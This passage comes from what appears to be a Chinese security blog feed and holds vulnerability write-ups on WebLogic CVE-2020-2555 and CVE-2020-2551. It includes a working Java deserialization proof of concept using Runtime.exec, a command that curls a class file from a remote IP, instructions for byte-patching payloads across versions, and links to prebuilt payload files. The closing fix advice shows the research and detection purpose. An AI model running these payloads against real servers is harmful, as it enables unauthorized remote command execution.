InitialContext();</code> 这个方式来实现绑定，最后绑定成功后实现回显的话就跟 <code>Hello</code> 中例子一样<br><code>ClusterMasterRemote clusterMasterRemote=(ClusterMasterRemote)initialContext.lookup(&quot;tttt&quot;);</code></p><p>编写实现</p><ol><li>写一个实现可实现ClusterMasterRemote接口的类</li><li>编写实现接口类的绑定方法，并且把命令执行的方法写入</li><li>把该类通过修改过的gadget利用链通过IIOP漏洞写入到服务器</li><li>通过修改过的gadget执行写入类的绑定方法</li><li>执行回显。</li></ol><p>最后放一个执行的过程：</p><p>写入类</p><p>执行类</p><p>执行回显</p><p><img src="https://img.zhiiyun.com/blog_2b0a7b1bf8d26cabd7e30e3859fbdb06" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/5up3rc/weblogic_cmd" target="_blank" rel="noopener">https://github.com/5up3rc/weblogic_cmd</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">作者：Ntears</span><br><span class="line">链接：https://xz.aliyun.com/t/7393</span><br><span class="line">来源：先知</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> iiop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漫谈 Weblogic CVE-2020-2555</title>
      <link href="/posts/975312a1/"/>
      <url>/posts/975312a1/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。</p><p>漏洞信息曝光之后，互联网中发布几篇该漏洞相关的分析文章以及利用 POC，但公布的 POC 有部分不足之处，导致漏洞检测效率变低，不足之处主要体现在：</p><p><strong>1 目前所有的利用工具都是通过动态编译进行生产 POC 文件而且必须要有 java 环境。</strong></p><p><strong>2.  公布的 POC 只是针对单独一个版本有效，无法适应多个 Weblogic 版本。</strong></p><p>漏洞影响情况：</p><ul><li>Oracle Coherence 3.7.1.17</li><li>Oracle Coherence &amp; Weblogic  12.1.3.0.0</li><li>Oracle Coherence &amp; Weblogic 12.2.1.3.0</li><li>Oracle Coherence &amp; Weblogic 12.2.1.4.0</li></ul><p>通过研究发现 Weblogic 10.3.6.0 版本不受影响范围内，虽然该版本默认自带了 Coherence（3.7），通过调试发现该版本默认并未启用 Coherence，所以 Weblogic 10.3.6.0 不在受影响范围内。</p><p><strong>注：</strong></p><p><strong>1. 经过大量的测试，我们的 POC 可稳定运行在多个操作系统、多个 weblogic 版本、多个 JDK 版本中。</strong></p><p><strong>2. 以上测试及分析环境全部基于内部环境。</strong></p><h2 id="漏洞调试分析"><a href="#漏洞调试分析" class="headerlink" title="漏洞调试分析"></a>漏洞调试分析</h2><p><strong>本文基于 Weblogic 12.1.3 版本进行研究分析测试。</strong></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>修改目录 <code>user_project/domains/bin</code> 目录中 <code>setDomainEnv.cmd</code> 或者 <code>setDomainEnv.sh</code>  文件，加<code>if %debugFlag == &quot;false&quot;%</code> 之前加入 <code>set debugFlag=true</code>。</p><p>拷贝 <code>Oracle_Home</code> 目录下所有文件至调试目录，并且 <code>coherence\lib</code> 添加 <code>Libraries</code>：</p><p><img src="https://img.zhiiyun.com/blog_b636d89a6eb8c2dbba118c4cc07b731f" alt=""></p><p>配置 <code>Remote</code> 方式进行远程调试， ip 设置为开启 <code>set debugFlag=true</code> 的服务器 IP， 端口为 <code>8453</code> ：</p><p><img src="https://img.zhiiyun.com/blog_0f5b23296a862f2bf90370233b2a428a" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该漏洞主要是因为 <code>com.tangosol.util.filter.LimitFilter#toString</code> 方法内部可通过 <code>m_comparator</code> 和 <code>m_oAnchorTop</code> 可自定义进行设置，形成利用链条导致漏洞的发生，以下为整个利用链条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                LimitFilter.toString()</span><br><span class="line">                    ChainedExtractor.extract()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>通过利用利用链条，可以基于 <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 中的 <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java" target="_blank" rel="noopener">CommonsCollections5</a> 进行构造利用 POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        String cmd = &quot;curl http://10.10.10.172:9999/Poc.class&quot;;</span><br><span class="line">        cmd = &quot;calc&quot;;</span><br><span class="line">        ValueExtractor[] valueExtractors = new ValueExtractor[]&#123;</span><br><span class="line">                new ReflectionExtractor(&quot;getMethod&quot;, new Object[]&#123;</span><br><span class="line">                        &quot;getRuntime&quot;, new Class[0]</span><br><span class="line">                &#125;),</span><br><span class="line">                new ReflectionExtractor(&quot;invoke&quot;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, cmd&#125;&#125;)</span><br><span class="line">//                new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;, cmd&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        // chain</span><br><span class="line">        LimitFilter limitFilter = new LimitFilter();</span><br><span class="line">        limitFilter.setTopAnchor(Runtime.class);</span><br><span class="line">        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);</span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;);</span><br><span class="line">        m_comparator.setAccessible(true);</span><br><span class="line">        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));</span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;);</span><br><span class="line">        m_oAnchorTop.setAccessible(true);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line">        Field val = expException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;/Users/0nise/IdeaProjects/vuldebug/cve-2020-2555/src/main/java/122130_linux_calc.666&quot;));</span><br><span class="line">        objectOutputStream.writeObject(expException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/blog_2c795b06cae4deaec7a9e1a2e7a70846" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞主要是因为 <code>com.tangosol.util.filter.LimitFilter#toString</code> 触发，通过跟踪我们可以看到 <code>m_oAnchorTop</code>  为 <code>classs java.lang.Runtime</code> ， 以及 <code>m_comparator</code> 为 <code>ValueExtractor</code> 接口的 <code>ChainedExtractor</code> 实现。</p><p><img src="https://img.zhiiyun.com/blog_32813d84b5b7121e60ed103496b9461a" alt=""></p><p><img src="https://img.zhiiyun.com/blog_7995538696b115c9a52e53e48225f3f7" alt=""></p><p>核心通过 <code>extractor.extract</code> 进行触发，跟踪代码会跳入 <code>com.tangosol.util.extractor.ChainedExtractor#extract</code> ，并且将每次执行结果作为参数，通过 <code>aExtractor[i].extract(oTarget)</code> 进行执行，第一次 <code>oTarget</code> 参数值为 <code>class java.lang.Runtime</code></p><p><img src="https://img.zhiiyun.com/blog_0bee2748524ba8ade43d6bee4bd4b26a" alt=""></p><p>跟踪进入 <code>aExtractor[i].extract(oTarget)</code>  会跳入 <code>com.tangosol.util.extractor.ReflectionExtractor#extract</code> ，最后通过 <code>method.invoke</code> 反射执行，也就是说开始执行 <code>java.lang.Runtime.getRuntime</code>，最后讲执行的结果进行 <code>return</code>，类型为 <code>java.lang.Runtime</code>，所以整个方法执行的代码为 <code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;,new Class[0]);</code></p><p><img src="https://img.zhiiyun.com/blog_5081b81f79e96197d8b0b491eae77ccc" alt=""></p><p>第二次将<code>java.lang.Runtime.getRuntime</code> （也就是 <code>java.lang.Runtime</code>） 作为 <code>oTarget</code> 参数值进行传入执行<br>进行循环 <code>method.invoke</code>，反射执行 <code>invoke</code> ，最终执行代码为<br><code>java.lang.Runtime.class.getMethod(&quot;getRuntime&quot;,new Class[0]).invoke(null, new Object[0])</code> ，最后执行完毕结果为 <code>java.lang.Runtime</code> 类，并且将 <code>return</code> 提供下次进行调用执行。</p><p><img src="https://img.zhiiyun.com/blog_3cb6d6f9e5463f4578f82b9dfbdf05d3" alt=""><br><img src="https://img.zhiiyun.com/blog_88ef785f8ba3ed1f08e1e3a15cf55d95" alt=""><br><img src="https://img.zhiiyun.com/blog_543303e6d4e05fa5d9326cfb0fcd1604" alt=""></p><p>最后通过 <code>java.lang.Runtime.exec</code> 进行反射执行命令，最终执行的代码为 <code>runtime.exec(new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;})</code> 达到执行命令的目的，弹出记事本。</p><p><img src="https://img.zhiiyun.com/blog_503b3c294714108a7f95717d1d17a44e" alt=""> </p><p><img src="https://img.zhiiyun.com/blog_8bea9e897bba8b002cf2409af5d28667" alt=""></p><p><img src="https://img.zhiiyun.com/blog_201846b512ca326fa649704c59c54825" alt=""></p><h3 id="weblogic-10-3-6"><a href="#weblogic-10-3-6" class="headerlink" title="weblogic 10.3.6"></a>weblogic 10.3.6</h3><p>weblogic 10.3.6 版本默认自带 coherence_3.7 ，但通过 Debug 调试发现 weblogic 10.3.6 并未启用 coherence_3.7 所以无法针对 weblogic 10.3.6  进行测试，但 coherence_3.7 版本中 <code>com.tangosol.util.filter.LimitFilter#toString</code> 漏洞仍然存在，所以  coherence 3.7 版本存在漏洞但 weblogic 10.3.6 默认情况下不存在该漏洞。</p><p><img src="https://img.zhiiyun.com/blog_ead5da4005a3589a5484bcd42338a0a3" alt=""></p><p><img src="https://img.zhiiyun.com/blog_a1d57640e6d210dd3f3f76bca6c19a17" alt=""></p><h2 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h2><p>经过分析发现 POC 很多不足之处，导致漏洞检测效率变低，同时无法进行通过其他语言开发调用。</p><h3 id="动态序列化问题"><a href="#动态序列化问题" class="headerlink" title="动态序列化问题"></a>动态序列化问题</h3><p>如果 POC 用于非 java 语言开发的扫描框架时，是非常麻烦的要么是将代码集成  <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> 然后通过进程调用的方式动态生成序列化文件，但该方法会不断的通过进程调用执行代码，会造成很大的资源开销。除了使用这种方法之外还可以通过加载以前的 POC 进行二进制读取并且替换代码重新生成序列化文件。</p><p>通过研究分析发现，修改参数内容时变动的内容主要为 <code>13 5B 4C 6A 61 76 61 2E 6C 61 6E 67 2E 53 74 72 69 6E 67 3B AD D2 56 E7 E9 1D 7B 47 02 00 00 78 70 00 00 00 03 74 00</code> 字节至 <code>00 04 65 78 65 63 70 70 76 72 00 11 6A 61 76 61 2E 6C 61 6E 67 2E 52 75 6E 74 69 6D 65 00 00 00 00 00 00 00 00 00 00 00 78 70</code> 的内容信息，其中左图的参数为 <code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;}</code>，右图的参数为 <code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;}</code>。</p><p><img src="https://img.zhiiyun.com/blog_aaab4d9d707e33acd313e176c868bce6" alt=""></p><p>通过分析相同 weblogic 版本中通过 <code>coherence.jar</code> 生成的 <code>payload</code>，比对其中差异发现参数构造的方式为：每个参数的长度转换为 16 进制，占用 2 个字节，不足用 <code>0</code> 补足 + 每个参数值的 Hex  码 + ( 70 weblogic  12.2.1.3.0 版本最后一位参数 ) +74 （作者理解为标识符），所以转换对应情况如下：</p><p><code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;notepad&quot;}</code> （ weblogic 12.2.1.3.0，需要加 70 其他版本不需要）对应的转换情况为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 03 63 6D 64 74 00 02 2F 63 74 00 07 6E 6F 74 65 70 61 64  70 74</span><br><span class="line">00 03  = &quot;cmd&quot;.length()</span><br><span class="line">63 6D 64 = &quot;cmd&quot;</span><br><span class="line">74 </span><br><span class="line">00 02 = &quot;/c&quot;.length()</span><br><span class="line"> 2F 63 = &quot;/c&quot;</span><br><span class="line">74</span><br><span class="line">00 07 = &quot;notepad&quot;.length()</span><br><span class="line">6E 6F 74 65 70 61 64 = &quot;notepad&quot;</span><br><span class="line">70</span><br><span class="line">74</span><br></pre></td></tr></table></figure><p><code>new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;}</code> （ weblogic 12.2.1.3.0，需要加 70 其他版本不需要）对应的转换情况为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 03 63 6D 64 74 00 02 2F 63 74 00 04 63 61 6C 63 70 74</span><br><span class="line">00 03  = &quot;cmd&quot;.length()</span><br><span class="line">63 6D 64 = &quot;cmd&quot;</span><br><span class="line">74 </span><br><span class="line">00 02 = &quot;/c&quot;.length()</span><br><span class="line"> 2F 63 = &quot;/c&quot;</span><br><span class="line">74</span><br><span class="line">00 04 = &quot;calc&quot;.length()</span><br><span class="line">63 61 6C 63  = &quot;calc&quot;</span><br><span class="line">70</span><br><span class="line">74</span><br></pre></td></tr></table></figure><p>了解了参数变动的规律以及对应的字节码，我们就可以基于该方式进行动态构建序列化文件。</p><p>测试中使用的各个版本生产 POC 序列化文件存放在 <a href="https://github.com/0nise/CVE-2020-2555" target="_blank" rel="noopener">CVE-2020-2555</a> <code>file</code> 目录中。</p><table><thead><tr><th style="text-align:center">版本</th><th style="text-align:center">文件名</th><th style="text-align:center">描述</th><th style="text-align:center">操作系统</th></tr></thead><tbody><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_calc.666" target="_blank" rel="noopener">121300_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_notepad.666" target="_blank" rel="noopener">121300_notepad.666</a></td><td style="text-align:center">notepad</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_ping.666" target="_blank" rel="noopener">121300_ping.666</a></td><td style="text-align:center">ping</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300.666" target="_blank" rel="noopener">121300.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_calc.666" target="_blank" rel="noopener">122130_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_linux_calc.666" target="_blank" rel="noopener">122130_linux_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_linux_curl.666" target="_blank" rel="noopener">122130_linux_curl.666</a></td><td style="text-align:center">curl</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_notepad.666" target="_blank" rel="noopener">122130_notepad.666</a></td><td style="text-align:center">notepad</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130.666" target="_blank" rel="noopener">122130.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_calc.666" target="_blank" rel="noopener">122140_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_linux_calc.666" target="_blank" rel="noopener">122140_linux_calc.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_linux_curl.666" target="_blank" rel="noopener">122140_linux_curl.666</a></td><td style="text-align:center">curl</td><td style="text-align:center">Linux</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_notepad.666" target="_blank" rel="noopener">122140_notepad.666</a></td><td style="text-align:center">notepad</td><td style="text-align:center">Windows</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140.666" target="_blank" rel="noopener">122140.666</a></td><td style="text-align:center">calc</td><td style="text-align:center">Windows</td></tr></tbody></table><h3 id="Coherence-版本问题"><a href="#Coherence-版本问题" class="headerlink" title="Coherence 版本问题"></a>Coherence 版本问题</h3><p>在研究测试时，通过某一个 Coherence 版本生成的序列化文件，无法适用于多个版本，以下为多版本的详细测试情况：</p><table><thead><tr><th style="text-align:center">poc 生成版本</th><th style="text-align:center">测试版本</th><th style="text-align:center">是否成功</th></tr></thead><tbody><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">是</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">否</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">是</td></tr></tbody></table><p>可以发现一个 POC 无法适用于多版本的 weblogic 中，针对该情况可以基于 weblogic 序列化文件转换为字节码结合动态序列化技术处理，来达到兼容多个版本的目的。</p><h2 id="Weblogic-的问题"><a href="#Weblogic-的问题" class="headerlink" title="Weblogic 的问题"></a>Weblogic 的问题</h2><p><strong> 截止 2020 年 3 月 4 日，通过 Oracle 官方进行下载 weblogic 时，通过研究发现该漏洞依然存在可以利用（所有受影响版本），需要额外安装补丁。</strong></p><p>如下文件为下文件MD5值以及下载时间：</p><table><thead><tr><th style="text-align:center">文件名称</th><th style="text-align:center">MD5</th><th style="text-align:center">创建时间</th></tr></thead><tbody><tr><td style="text-align:center">fmw_12.1.3.0.0_wls.jar</td><td style="text-align:center">8378FE936B476A6F4CA5EFA465A435E3</td><td style="text-align:center">‎2020‎-03‎-04‎</td></tr><tr><td style="text-align:center">fmw_12.2.1.3.0_wls.jar</td><td style="text-align:center">6E7105521029058AD64A5C6198DB09F7</td><td style="text-align:center">‎2017-08‎-21‎</td></tr><tr><td style="text-align:center">fmw_12.2.1.4.0_wls.jar</td><td style="text-align:center">AA090712069684991BA27E4DE9ED3FF6</td><td style="text-align:center">‎2019-09‎-13‎</td></tr><tr><td style="text-align:center">coherence.jar(12.1.3.0.0)</td><td style="text-align:center">E807E84D352374E33D0E2A8CC649534A</td><td style="text-align:center">2014-05-14</td></tr><tr><td style="text-align:center">coherence.jar(12.2.1.3.0)</td><td style="text-align:center">2302E408BCA7C6A82081A20CE0811B0E</td><td style="text-align:center">2017-08-15</td></tr><tr><td style="text-align:center">coherence.jar(12.2.1.4.0)</td><td style="text-align:center">B28EE46B9B9BD5C24DF3BFEE10075BA4</td><td style="text-align:center">2019-09-12</td></tr></tbody></table><p>建议目前已经安装最新版 weblogic 的管理员也需排查该漏洞，如有漏洞建议立即安装补丁或通过修复方案进行修复，防止被不法分子利用。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol><li>临时解决方案：禁用 weblogic T3 协议。</li><li>安装 <a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">Oracle 更新补丁</a>，需要登录帐户后下载。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://nosec.org/home/detail/4205.html" target="_blank" rel="noopener">CVE-2020-2555：WebLogic远程代码执行漏洞</a></li><li><a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">CVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLE’S WEBLOGIC SERVER</a></li><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">浅析Java序列化和反序列化</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> t3 </tag>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漫谈 WebLogic CVE-2020-2551</title>
      <link href="/posts/b64d9185/"/>
      <url>/posts/b64d9185/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>2020 年 1月14日，Oracle 发布了大量安全补丁，修复了 43 个严重漏洞，CVSS 评分均在在9.1以上。<br>其中 CVE-2020-2551 漏洞，互联网中公布了几篇针对该漏洞的分析文章以及POC，但公布的 POC 有部分不足之处，导致漏洞检测效率变低，不足之处主要体现在：</p><ol><li><strong>公布的 POC 代码只针对直连（内网）网络有效，Docker、NAT 网络全部无效。</strong></li><li><strong>公布的 POC 代码只支持单独一个版本，无法适应多个 weblogic 版本。</strong></li></ol><p><strong>注：</strong><br><strong> 1. 经过大量的测试，我们的 POC 可稳定运行在多个操作系统、多个 weblogic 版本、多个 JDK 版本以及 Docker 网络中。</strong><br><strong> 2.  以上测试及分析环境全部基于内部环境。</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过 Oracle 官方发布的公告是可以看出该漏洞的主要是在核心组件中的，影响协议为 IIOP 。该漏洞原理上类似于RMI反序列化漏洞（CVE-2017-3241），和之前的T3协议所引发的一系列反序列化漏洞也很相似，都是由于调用远程对象的实现存在缺陷，导致序列化对象可以任意构造，并没有进行安全检查所导致的。</p><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>为了能够更好的理解本文稿中所描述 RMI、IIOP、GIOP、CORBA 等协议名称，下面来进行简单介绍。</p><h3 id="IDL与Java-IDL"><a href="#IDL与Java-IDL" class="headerlink" title="IDL与Java IDL"></a>IDL与Java IDL</h3><p>IDL全称（Interface Definition Language）也就是接口定义语言，它主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p><p>在基于IDL构建的软件系统中就存在一个OMG IDL（对象管理组标准化接口定义语言），其用于CORBA中。</p><p>就如上文所说，IDL是与编程语言无关的一种规范化描述性语言，不同的编程语言为了将其转化成IDL，都制定了一套自用的编译器用于将可读取的OMG IDL文件转换或映射成相应的接口或类型。Java IDL就是Java实现的这套编译器。</p><h3 id="RMI、JRMP、JNDI"><a href="#RMI、JRMP、JNDI" class="headerlink" title="RMI、JRMP、JNDI"></a>RMI、JRMP、JNDI</h3><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。<br>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p><p>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><p>目前基于 JNDI 实现的几本为 rmi 与 ldap 的目录服务系统，构建 rmi 、ldap 比较常用的的工具有 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a> 、<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>。</p><p>更多信息建议查阅<a href="https://www.anquanke.com/post/id/194384" target="_blank" rel="noopener">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a>。</p><h3 id="ORB与GIOP、IIOP"><a href="#ORB与GIOP、IIOP" class="headerlink" title="ORB与GIOP、IIOP"></a>ORB与GIOP、IIOP</h3><p>ORB全称（Object Request Broker）对象请求代理。ORB是一个中间件，他在对象间建立一个CS关系，或者更简单点来说，就是一个代理。客户端可以很简单的通过这个媒介使用服务器对象的方法而不需要关注服务器对象是在同一台机器上还是通过远程网络调用的。ORB截获调用后负责找到一个对象以满足该请求。<br>GIOP全称（General Inter-ORB Protocol）通用对象请求协议，其功能简单来说就是CORBA用来进行数据传输的协议。GIOP针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP（Internet Inter-ORB Protocol）。所以说通过TCP协议传输的GIOP数据可以称为IIOP。</p><p>而ORB与GIOP的关系是GIOP起初就是为了满足ORB间的通信的协议。所以也可以说ORB是CORBA通信的媒介。</p><h3 id="CORBA"><a href="#CORBA" class="headerlink" title="CORBA"></a>CORBA</h3><p>CORBA全称（Common ObjectRequest Broker 